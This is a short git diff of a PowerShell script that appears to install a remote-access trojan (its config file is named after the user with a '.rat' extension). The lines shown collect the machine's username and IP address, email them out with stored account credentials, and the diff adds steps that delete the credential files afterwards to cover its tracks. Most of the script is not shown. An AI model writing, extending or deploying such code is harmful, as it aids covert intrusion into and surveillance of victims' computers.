@@ -35,7 +35,7 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 $configfile = "$env:UserName.rat"
 $email = Get-Content email.txt
-$eword = Get-Content password.txt
+$eword = Get-Content eword.txt
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
 
 # writes config file
@@ -48,6 +48,8 @@ Send-MailMessage -From $email -To $email -Subject $configfile -Attachment $confi
 
 # delete config file
 Remove-Item -Path $configfile
+Remove-Item -Path email.txt
+Remove-Item -Path eword.txt
 
 # goto temp, make working directory
 mkdir $path
